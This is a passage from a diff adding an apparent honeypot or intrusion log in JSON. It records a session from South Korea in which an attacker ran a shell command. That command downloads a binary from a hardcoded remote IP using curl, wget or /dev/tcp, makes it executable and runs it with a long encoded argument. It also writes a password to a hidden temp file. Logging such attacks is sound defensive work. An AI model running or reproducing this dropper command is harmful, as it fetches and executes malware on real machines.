0Rs402sKjjZLGFAFOhI5ESIDUxlVIoMWd9Y+Fa2rDyLVcAiBNFUYUwI0HzcFJgZWB1M7lQl21zYNrK0IOcR2AZUzVRxMAicdLhkkB1gfVTOJCGXVPQmyqhU+02sKijVfH1ICJh8gGC0dUxxXLIoJcco+C66mDTzVdQ2bM1AQTAEmGC4ZJANMH1E4jQh00D8bqKsVPtd8Fo8wSxtTBy4dMBomAEIRSzOPCGvWPw+yrQg63nMIijJQCVMBIQU5GDoCWhlLNokCc9Q9D6+8DzvKdwyILFcRTAIjGjodJAJRGkUzgw1r1TsDsqgMItVyCoE0VRhWCjQfNwUmAFsHVzeIFn3TNg2srQg0xHEPlTNXGUwGIQUzEi4FUhhRMJsMcso0DbKtDDrKcAiBNFUYVgY0Ey4ZJQtMG1c3lQx33joLrawKLNByFow0SxtTAjoTOBEiA1MaVCKJCXTKOAqyrQs1ynAOgTRVGFADNBo1EjoBUBpLMIsIa9I4AaqsCjjXZQmKM0sYUx0lEy4aLARYH1UziAtl0SIJrKoVPtZyFog1Xx9SAiAfIBohAUweVSyJCX3KPQytpg081XcAmzNVGEwCJxkuGSAHTBhcOoEOddU9DrykFT7VfRaJMVEHVwMuHTAaJwNCHVIsgwtr1jwIsq0DP95zCIoxXQlWBDoaMhs6BlcHVjuBDnXVOAm8rQg1ynQOiSxXGlAdLRI6HSQCUx9FM4kJa9A8Fa6vCiLVdw2BNFUYUAs0HDIFIgNMHF0sgwB/0jwKqKgbONNrCog6SxhVCjoaNBkuBVIYVDr/y2GAzQWtrDO0hkhs/CDXeHvknVauFj2IZG3wYxUI" &#UPX!""",
+            "session": "3f3f74125c70",
+            "message": """CMD: nohup $SHELL -c "curl http://185.178.47.172:60149/linux -o /tmp/P2RZtzVYgY; if [ ! -f /tmp/P2RZtzVYgY ]; then wget http://185.178.47.172:60149/linux -O /tmp/P2RZtzVYgY; fi; if [ ! -f /tmp/P2RZtzVYgY ]; then exec 6<>/dev/tcp/185.178.47.172/60149 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/P2RZtzVYgY ; chmod +x /tmp/P2RZtzVYgY && /tmp/P2RZtzVYgY 0Rs402sKjjZLGFAFOhI5ESIDUxlVIoMWd9Y+Fa2rDyLVcAiBNFUYUwI0HzcFJgZWB1M7lQl21zYNrK0IOcR2AZUzVRxMAicdLhkkB1gfVTOJCGXVPQmyqhU+02sKijVfH1ICJh8gGC0dUxxXLIoJcco+C66mDTzVdQ2bM1AQTAEmGC4ZJANMH1E4jQh00D8bqKsVPtd8Fo8wSxtTBy4dMBomAEIRSzOPCGvWPw+yrQg63nMIijJQCVMBIQU5GDoCWhlLNokCc9Q9D6+8DzvKdwyILFcRTAIjGjodJAJRGkUzgw1r1TsDsqgMItVyCoE0VRhWCjQfNwUmAFsHVzeIFn3TNg2srQg0xHEPlTNXGUwGIQUzEi4FUhhRMJsMcso0DbKtDDrKcAiBNFUYVgY0Ey4ZJQtMG1c3lQx33joLrawKLNByFow0SxtTAjoTOBEiA1MaVCKJCXTKOAqyrQs1ynAOgTRVGFADNBo1EjoBUBpLMIsIa9I4AaqsCjjXZQmKM0sYUx0lEy4aLARYH1UziAtl0SIJrKoVPtZyFog1Xx9SAiAfIBohAUweVSyJCX3KPQytpg081XcAmzNVGEwCJxkuGSAHTBhcOoEOddU9DrykFT7VfRaJMVEHVwMuHTAaJwNCHVIsgwtr1jwIsq0DP95zCIoxXQlWBDoaMhs6BlcHVjuBDnXVOAm8rQg1ynQOiSxXGlAdLRI6HSQCUx9FM4kJa9A8Fa6vCiLVdw2BNFUYUAs0HDIFIgNMHF0sgwB/0jwKqKgbONNrCog6SxhVCjoaNBkuBVIYVDr/y2GAzQWtrDO0hkhs/CDXeHvknVauFj2IZG3wYxUI; fi; echo Aa@123456 > /tmp/.opass; chmod +x /tmp/P2RZtzVYgY && /tmp/P2RZtzVYgY 0Rs402sKjjZLGFAFOhI5ESIDUxlVIoMWd9Y+Fa2rDyLVcAiBNFUYUwI0HzcFJgZWB1M7lQl21zYNrK0IOcR2AZUzVRxMAicdLhkkB1gfVTOJCGXVPQmyqhU+02sKijVfH1ICJh8gGC0dUxxXLIoJcco+C66mDTzVdQ2bM1AQTAEmGC4ZJANMH1E4jQh00D8bqKsVPtd8Fo8wSxtTBy4dMBomAEIRSzOPCGvWPw+yrQg63nMIijJQCVMBIQU5GDoCWhlLNokCc9Q9D6+8DzvKdwyILFcRTAIjGjodJAJRGkUzgw1r1TsDsqgMItVyCoE0VRhWCjQfNwUmAFsHVzeIFn3TNg2srQg0xHEPlTNXGUwGIQUzEi4FUhhRMJsMcso0DbKtDDrKcAiBNFUYVgY0Ey4ZJQtMG1c3lQx33joLrawKLNByFow0SxtTAjoTOBEiA1MaVCKJCXTKOAqyrQs1ynAOgTRVGFADNBo1EjoBUBpLMIsIa9I4AaqsCjjXZQmKM0sYUx0lEy4aLARYH1UziAtl0SIJrKoVPtZyFog1Xx9SAiAfIBohAUweVSyJCX3KPQytpg081XcAmzNVGEwCJxkuGSAHTBhcOoEOddU9DrykFT7VfRaJMVEHVwMuHTAaJwNCHVIsgwtr1jwIsq0DP95zCIoxXQlWBDoaMhs6BlcHVjuBDnXVOAm8rQg1ynQOiSxXGlAdLRI6HSQCUx9FM4kJa9A8Fa6vCiLVdw2BNFUYUAs0HDIFIgNMHF0sgwB/0jwKqKgbONNrCog6SxhVCjoaNBkuBVIYVDr/y2GAzQWtrDO0hkhs/CDXeHvknVauFj2IZG3wYxUI" &#UPX!"""
+          },
+          "GeoLocation": {
+            "country_name": "South Korea"
+          },
+          "timestamp": "2026-03-03T10:34:09.920+0000"
+        },
+        "sort": [
+          1772534049920
+        ]
+      }
+    ]
+  }
+}
